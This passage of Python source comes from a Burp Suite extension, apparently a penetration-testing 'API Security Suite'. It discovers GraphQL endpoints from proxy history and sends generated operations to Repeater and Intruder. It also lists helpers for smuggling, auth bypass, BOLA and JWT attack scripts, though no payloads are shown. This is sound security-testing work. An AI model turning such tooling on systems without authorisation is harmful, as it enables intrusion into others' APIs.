    use_https = self._ascii_safe(parsed.getProtocol() or "https", lower=True) == "https"
    port = parsed.getPort()
    if port == -1:
        port = 443 if use_https else 80

    path = self._ascii_safe(parsed.getPath() or "/").strip()
    if not path:
        path = "/"
    query = self._ascii_safe(parsed.getQuery() or "").strip()
    if query:
        path = "{}?{}".format(path, query)

    query_text = self._ascii_safe((operation or {}).get("query") or "").strip()
    op_name = self._ascii_safe((operation or {}).get("operation_name") or "graphql_op")
    custom_headers = self._parse_graphql_custom_headers()
    request_mode = self._ascii_safe(
        str(self.graphql_request_mode_combo.getSelectedItem())
        if getattr(self, "graphql_request_mode_combo", None) is not None
        else "POST JSON"
    )
    request_mode = self._ascii_safe(request_mode, lower=True)
    headers = [
        "Host: {}".format(host),
        "Accept: application/json",
        "Connection: close",
    ]
    for key, value in custom_headers:
        headers.append("{}: {}".format(key, value))

    if request_mode == "get query":
        query_pairs = [
            "query={}".format(url_quote(query_text, safe="")),
            "operationName={}".format(url_quote(op_name, safe="")),
        ]
        if "?" in path:
            request_target = "{}&{}".format(path, "&".join(query_pairs))
        else:
            request_target = "{}?{}".format(path, "&".join(query_pairs))
        request = "GET {} HTTP/1.1\r\n{}\r\n\r\n".format(
            request_target, "\r\n".join(headers)
        )
    else:
        payload = json.dumps({"operationName": op_name, "query": query_text})
        headers.insert(1, "Content-Type: application/json")
        headers.append("Content-Length: {}".format(len(payload)))
        request = "POST {} HTTP/1.1\r\n{}\r\n\r\n{}".format(
            path, "\r\n".join(headers), payload
        )

    return {
        "host": host,
        "port": port,
        "use_https": use_https,
        "request": request,
        "operation_name": op_name,
    }

def _send_graphql_operations_to_repeater(self):
    """Send generated GraphQL operations to Burp Repeater."""
    operations = self._collect_graphql_delivery_operations(max_count=30)
    if not operations:
        self.graphql_area.append(
            "[!] No GraphQL operations available. Enable at least one Raider family first.\n"
        )
        return

    targets = self._collect_graphql_targets(1)
    if not targets:
        self.graphql_area.append(
            "[!] No GraphQL target URL available. Set Targets and retry.\n"
        )
        return
    target_url = targets[0]

    sent = 0
    for operation in operations:
        request_pack = self._graphql_build_http_request(target_url, operation)
        if not request_pack:
            continue
        try:
            self._callbacks.sendToRepeater(
                request_pack["host"],
                request_pack["port"],
                request_pack["use_https"],
                self._helpers.stringToBytes(request_pack["request"]),
                request_pack["operation_name"],
            )
            sent += 1
        except Exception as e:
            self._callbacks.printError(
                "GraphQL Repeater send failed ({}): {}".format(
                    request_pack.get("operation_name"), self._ascii_safe(e)
                )
            )

    self.graphql_area.append(
        "[+] Sent {} generated operations to Repeater using target {}\n".format(
            sent, target_url
        )
    )
    self.log_to_ui("[+] GraphQL -> Repeater: {} requests".format(sent))

def _send_graphql_operations_to_intruder(self):
    """Send generated GraphQL operations to Burp Intruder."""
    operations = self._collect_graphql_delivery_operations(max_count=20)
    if not operations:
        self.graphql_area.append(
            "[!] No GraphQL operations available. Enable at least one Raider family first.\n"
        )
        return

    targets = self._collect_graphql_targets(1)
    if not targets:
        self.graphql_area.append(
            "[!] No GraphQL target URL available. Set Targets and retry.\n"
        )
        return
    target_url = targets[0]

    sent = 0
    for operation in operations:
        request_pack = self._graphql_build_http_request(target_url, operation)
        if not request_pack:
            continue
        try:
            self._callbacks.sendToIntruder(
                request_pack["host"],
                request_pack["port"],
                request_pack["use_https"],
                self._helpers.stringToBytes(request_pack["request"]),
            )
            sent += 1
        except Exception as e:
            self._callbacks.printError(
                "GraphQL Intruder send failed ({}): {}".format(
                    request_pack.get("operation_name"), self._ascii_safe(e)
                )
            )

    self.graphql_area.append(
        "[+] Sent {} generated operations to Intruder using target {}\n".format(
            sent, target_url
        )
    )
    self.log_to_ui("[+] GraphQL -> Intruder: {} requests".format(sent))

def _graphql_target_candidate_score(self, entry):
    """Score likely GraphQL endpoint candidates from captured traffic."""
    path = self._ascii_safe(
        entry.get("path") or entry.get("normalized_path") or "/", lower=True
    )
    query = self._ascii_safe(entry.get("query_string") or "", lower=True)
    body = self._ascii_safe(entry.get("request_body") or "", lower=True)
    content_type = self._ascii_safe(entry.get("content_type") or "", lower=True)
    method = self._ascii_safe(entry.get("method") or "GET", lower=True).strip().upper()

    score = 0
    if "graphql" in path:
        score += 12
    if "graphiql" in path or "playground" in path:
        score += 8
    if "graphql" in query:
        score += 7
    if any(token in query for token in ["query=", "operationname=", "__schema", "__type"]):
        score += 6
    if any(
        token in body
        for token in [
            '"query"',
            '"operationname"',
            "mutation",
            "subscription",
            "__schema",
            "__type",
        ]
    ):
        score += 8
    if "application/graphql" in content_type:
        score += 6
    if method in ["GET", "POST"] and score > 0:
        score += 1
    return score

def _collect_graphql_target_candidates(self, max_candidates=30):
    """Collect ranked GraphQL target candidates from input and proxy history."""
    try:
        max_items = int(max_candidates)
    except Exception as e:
        self._callbacks.printError(
            "GraphQL candidate max parsing failed: {}".format(
                self._ascii_safe(e)
            )
        )
        max_items = 30
    if max_items <= 0:
        max_items = 30

    candidate_scores = {}

    raw_input = self._ascii_safe(self.graphql_targets_field.getText()).strip()
    if raw_input:
        for raw in self._parse_graphql_target_values(raw_input):
            url = self._normalize_graphql_target_url(raw)
            if not url:
                continue
            candidate_scores[url] = max(candidate_scores.get(url, 0), 40)

    with self.lock:
        snapshot = list(self.api_data.values())
    for entries in snapshot:
        entry = self._get_entry(entries)
        score = self._graphql_target_candidate_score(entry)
        if score <= 0:
            continue
        url = self._clean_url(self._build_url(entry, True))
        if not url:
            continue
        previous = candidate_scores.get(url, 0)
        if score > previous:
            candidate_scores[url] = score

    ordered = sorted(
        candidate_scores.items(), key=lambda item: (-int(item[1]), item[0])
    )
    return [
        {"url": url, "score": int(score)}
        for url, score in ordered[:max_items]
    ]

def _autopopulate_graphql_targets_from_history(
    self, overwrite=False, append_output=False
):
    """Populate GraphQL targets field with selected proxy-history candidates."""
    if not hasattr(self, "graphql_targets_field") or self.graphql_targets_field is None:
        return []

    current_values = self._parse_graphql_target_values(
        self.graphql_targets_field.getText()
    )
    if current_values and (not overwrite):
        self.graphql_selected_targets = list(current_values)
        return list(current_values)

    candidates = self._collect_graphql_target_candidates(max_candidates=60)
    self.graphql_target_candidates = list(candidates)
    candidate_urls = [item.get("url") for item in candidates if item.get("url")]
    if not candidate_urls:
        if append_output and hasattr(self, "graphql_area") and self.graphql_area is not None:
            self.graphql_area.append("[!] No GraphQL targets found in proxy history\n")
        return []

    selected = []
    existing = list(getattr(self, "graphql_selected_targets", []) or [])
    if existing and (not overwrite):
        selected = [u for u in existing if u in candidate_urls]
    if not selected:
        selected = list(candidate_urls)

    max_targets = self._parse_positive_int(
        self.graphql_max_targets_field.getText(), 12, 1, 50
    )
    selected = selected[:max_targets]
    self.graphql_selected_targets = list(selected)
    # JTextField is single-line, so keep separators comma-based for reliable re-parse.
    self.graphql_targets_field.setText(", ".join(selected))

    if append_output and hasattr(self, "graphql_area") and self.graphql_area is not None:
        self.graphql_area.append(
            "[+] GraphQL targets selected from history: {}\n".format(
                len(selected)
            )
        )
    return list(selected)

def _show_graphql_targets_popup(self, event):
    """Show selectable GraphQL targets from proxy history."""
    candidates = self._collect_graphql_target_candidates(max_candidates=80)
    self.graphql_target_candidates = list(candidates)
    if not candidates:
        if hasattr(self, "graphql_area") and self.graphql_area is not None:
            self.graphql_area.setText(
                "[!] No GraphQL targets found in proxy history.\n"
                "[*] Enter targets manually in textbox.\n"
            )
        return

    options = []
    for idx, item in enumerate(candidates):
        url = self._ascii_safe(item.get("url") or "").strip()
        if not url:
            continue
        score = int(item.get("score") or 0)
        options.append(
            {
                "value": url,
                "label": "#{:02d} [score {}] {}".format(idx + 1, score, url),
            }
        )

    preselected = list(getattr(self, "graphql_selected_targets", []) or [])
    if not preselected:
        preselected = [item.get("value") for item in options]

    selected = self._show_multi_select_targets_popup(
        "GraphQL Targets",
        options,
        preselected_values=preselected,
        footer_text=(
            "Default selection is all likely GraphQL targets from proxy history. "
            "Deselect anything you do not want to include."
        ),
    )
    if selected is None:
        return

    max_targets = self._parse_positive_int(
        self.graphql_max_targets_field.getText(), 12, 1, 50
    )
    selected = list(selected[:max_targets])
    self.graphql_selected_targets = list(selected)
    # JTextField is single-line, so keep separators comma-based for reliable re-parse.
    self.graphql_targets_field.setText(", ".join(selected))

    if hasattr(self, "graphql_area") and self.graphql_area is not None:
        self.graphql_area.append(
            "[+] GraphQL target selection updated: {}\n".format(len(selected))
        )

def _collect_graphql_targets(self, max_targets):
    """Collect GraphQL targets from optional input and Recon history."""
    targets = []
    seen = set()
    max_items = self._parse_positive_int(max_targets, 12, 1, 50)

    selected_values = list(getattr(self, "graphql_selected_targets", []) or [])
    raw_input = self._ascii_safe(self.graphql_targets_field.getText()).strip()
    if raw_input:
        selected_values = self._parse_graphql_target_values(raw_input)
        self.graphql_selected_targets = list(selected_values)
    elif not selected_values:
        selected_values = self._autopopulate_graphql_targets_from_history(
            overwrite=False, append_output=False
        )

    for value in selected_values:
        clean = self._normalize_graphql_target_url(value)
        if clean and clean not in seen:
            seen.add(clean)
            targets.append(clean)
            if len(targets) >= max_items:
                return targets

    for item in self._collect_graphql_target_candidates(max_candidates=max_items * 4):
        clean = self._normalize_graphql_target_url(item.get("url") or "")
        if clean and clean not in seen:
            seen.add(clean)
            targets.append(clean)
            if len(targets) >= max_items:
                return targets
    return targets

def _graphql_base_urls(self, urls):
    """Build base URLs (scheme://host[:port]) from full URLs."""
    bases = []
    seen = set()
    for url in (urls or []):
        safe = self._ascii_safe(url).strip()
        if not safe:
            continue
        try:
            parsed = URL(safe)
            protocol = self._ascii_safe(parsed.getProtocol() or "https", lower=True)
            host = self._ascii_safe(parsed.getHost() or "", lower=True).strip()
            if not host:
                continue
            port = parsed.getPort()
            if port == -1:
                base = "{}://{}".format(protocol, host)
            else:
                base = "{}://{}:{}".format(protocol, host, int(port))
            if base not in seen:
                seen.add(base)
                bases.append(base)
        except Exception as parse_err:
            self._callbacks.printError(
                "GraphQL base parse error: {}".format(str(parse_err))
            )
            continue
    return bases

def _run_graphql_analysis(self, event):
    """Run GraphQL-focused analysis using available external tools."""
    try:
        if hasattr(self, "graphql_area") and self.graphql_area is not None:
            self.graphql_area.setText("[*] Launching GraphQL analysis...\n")
        return heavy_runners._run_graphql_analysis(self, event)
    except Exception as e:
        err = self._ascii_safe(e)
        if hasattr(self, "graphql_area") and self.graphql_area is not None:
            self.graphql_area.append(
                "[!] GraphQL run launch failed: {}\n".format(err)
            )
        self._callbacks.printError(
            "GraphQL run launch failed: {}".format(err)
        )
        self.log_to_ui("[!] GraphQL run launch failed: {}".format(err))
        return None

def _export_graphql_results(self):
    """Export GraphQL analysis summary lines."""
    with self.graphql_lock:
        data = list(self.graphql_results)
    self._export_list_to_file(
        data, "GraphQL_Export", self.graphql_area, "graphql analysis lines"
    )

def _send_graphql_to_recon(self):
    """Send GraphQL discovered candidates to Recon tab."""
    with self.graphql_lock:
        candidates = list(self.graphql_recon_candidates)
    if not candidates:
        self.graphql_area.append("\n[!] No GraphQL candidates to send\n")
        return
    self._import_endpoint_candidates_to_recon(
        candidates, "graphql-analysis", self.graphql_area
    )

def _run_nuclei(self):
    """Run Nuclei scanner on endpoints from Recon tab"""
    return heavy_runners._run_nuclei(self)

def getTabCaption(self):
    with self.lock:
        count = len(self.api_data)
    return (
        "API Security Suite"
        if count == 0
        else "API Security Suite ({})".format(count)
    )

def getUiComponent(self):
    return self._panel

def processHttpMessage(self, toolFlag, messageIsRequest, messageInfo):
    if not self.auto_capture.isSelected():
        return
    if not messageIsRequest:
        source_tool = self._resolve_tool_name(toolFlag)
        source_tool_lower = self._ascii_safe(source_tool, lower=True).strip()
        if source_tool_lower == "extender" and (
            not bool(getattr(self, "capture_extender_traffic", False))
        ):
            return
        self._process_traffic(
            messageInfo,
            source_tool=source_tool,
        )

def processProxyMessage(self, messageIsRequest, message):
    if not self.auto_capture.isSelected():
        return
    if not messageIsRequest:
        self._process_traffic(message.getMessageInfo(), source_tool="Proxy")

def _resolve_tool_name(self, tool_flag):
    """Resolve Burp tool flag into a readable source name."""
    if tool_flag is None:
        return "Unknown"
    try:
        name = self._ascii_safe(self._callbacks.getToolName(tool_flag)).strip()
        return name if name else "Unknown"
    except Exception as e:
        self._callbacks.printError(
            "Tool name resolve failed ({}): {}".format(tool_flag, str(e))
        )
        return "Unknown"

def _process_traffic(self, messageInfo, source_tool="Unknown"):
    return jython_size_helpers.process_traffic(self, messageInfo, source_tool)

def _normalize_path(self, path):
    # Use pre-compiled patterns for better performance
    path = self.NUMERIC_ID_PATTERN.sub("/{id}", path)
    path = self.UUID_PATTERN.sub("/{uuid}", path)
    path = self.OBJECTID_PATTERN.sub("/{objectid}", path)
    return path

def _extract_params(self, req_info):
    params = {"url": {}, "body": {}, "cookie": {}, "json": {}}
    try:
        for param in req_info.getParameters()[:50]:  # Limit to 50 params
            ptype = param.getType()
            name = (param.getName() or "")[:100]  # Limit name length
            value = (param.getValue() or "")[:1000]  # Limit value length
            if ptype == self.PARAM_URL:
                params["url"][name] = value
            elif ptype == self.PARAM_BODY:
                params["body"][name] = value
            elif ptype == self.PARAM_COOKIE:
                params["cookie"][name] = value
            elif ptype == self.PARAM_JSON:
                params["json"][name] = value
    except Exception as e:
        self._callbacks.printError("Param extraction error: " + str(e))
    return params

def _extract_headers(self, req_info):
    headers = {}
    try:
        for header in req_info.getHeaders()[1:20]:  # Limit to 20 headers
            if ":" in header:
                key, val = header.split(":", 1)
                headers[key.strip()] = val.strip()[:500]  # Limit header value size
    except Exception as e:
        self._callbacks.printError("Header extraction error: " + str(e))
    return headers

def _extract_response_headers(self, resp_info):
    headers = {}
    try:
        for header in resp_info.getHeaders()[1:20]:  # Limit to 20 headers
            if ":" in header:
                key, val = header.split(":", 1)
                headers[key.strip()] = val.strip()[:500]  # Limit header value size
    except Exception as e:
        self._callbacks.printError("Response header extraction error: " + str(e))
    return headers

__all__ = [
    "_get_json_smuggling",
    "_get_xml_entity_tricks",
    "_get_protocol_smuggling",
    "_get_regex_dos",
    "_get_timing_attacks",
    "_generate_fuzzing",
    "_send_fuzzing_to_intruder",
    "_build_intruder_request",
    "_load_success_patterns",
    "_detect_vulnerability",
    "_select_payloads_for_param",
    "_generate_curl_command",
    "_copy_attack_as_curl",
    "_export_payloads",
    "_export_ai_context",
    "_build_ai_export_bundle",
    "_build_ai_bundle_schema_contract",
    "_validate_ai_bundle_schema",
    "_collect_all_tabs_ai_context",
    "_ai_prep_layer_enabled",
    "_build_ai_prep_layer",
    "_build_ai_prep_invariant_hints",
    "_build_ai_prep_sequence_candidates",
    "_build_ai_prep_evidence_graph",
    "_snapshot_list_attr",
    "_snapshot_dict_attr",
    "_snapshot_text_area",
    "_sanitize_for_ai_payload",
    "_export_vulnerability_context_for_ai",
    "_format_ai_sample",
    "_sanitize_headers_for_ai",
    "_sanitize_text_for_ai",
    "_extract_response_patterns",
    "_calc_length_variance",
    "_extract_error_signatures",
    "_analyze_json_structure",
    "_extract_html_elements",
    "_extract_interesting_headers",
    "_detect_response_anomalies",
    "_extract_errors",
    "_extract_param_names",
    "_infer_param_types",
    "_detect_validation",
    "_identify_injection_points",
    "_detect_encoding_context",
    "_find_similar_endpoints",
    "_calculate_endpoint_similarity",
    "_get_shared_params",
    "_compare_behaviors",
    "_detect_waf",
    "_detect_rate_limit",
    "_suggest_auth_bypass",
    "_export_behavioral_analysis",
    "_analyze_state_transitions",
    "_analyze_param_dependencies",
    "_identify_required_params",
    "_identify_optional_params",
    "_identify_hidden_params",
    "_detect_param_interactions",
    "_analyze_rate_limits",
    "_analyze_sessions",
    "_build_authz_matrix",
    "_create_ai_feedback_loop_export",
    "_generate_refinement_hints",
    "_extract_learned_patterns",
    "_export_for_llm_platform",
    "_export_openai_format",
    "_export_anthropic_format",
    "_export_ollama_format",
    "_get_vuln_summary",
    "_extract_api_patterns",
    "_extract_auth_flows",
    "_extract_business_logic",
    "_calculate_attack_severity",
    "_generate_enhanced_ai_prompt",
    "_generate_ai_prompt",
    "_export_turbo_intruder",
    "_generate_race_script",
    "_generate_bola_script",
    "_generate_jwt_script",
    "_export_nuclei_targets",
    "_collect_nuclei_targets",
    "_infer_nuclei_output_severity",
    "_extract_nuclei_plain_findings",
    "_write_nuclei_partial_results_jsonl",
    "_resolve_graphql_tool_path",
    "_normalize_graphql_target_url",
    "_parse_graphql_target_values",
    "_export_graphql_batch_queries",
    "_graphql_profile_presets",
    "_apply_graphql_profile",
    "_graphql_attack_family_selection",
    "_collect_graphql_raider_operations",
    "_parse_graphql_custom_headers",
    "_collect_graphql_delivery_operations",
    "_graphql_build_http_request",
    "_send_graphql_operations_to_repeater",
    "_send_graphql_operations_to_intruder",
    "_graphql_target_candidate_score",
    "_collect_graphql_target_candidates",
    "_autopopulate_graphql_targets_from_history",
    "_show_graphql_targets_popup",
    "_collect_graphql_targets",
    "_graphql_base_urls",
    "_run_graphql_analysis",
    "_export_graphql_results",
    "_send_graphql_to_recon",
    "_run_nuclei",
    "getTabCaption",
    "getUiComponent",
    "processHttpMessage",
    "processProxyMessage",
    "_resolve_tool_name",
    "_process_traffic",
    "_normalize_path",
    "_extract_params",
    "_extract_headers",
    "_extract_response_headers",
]
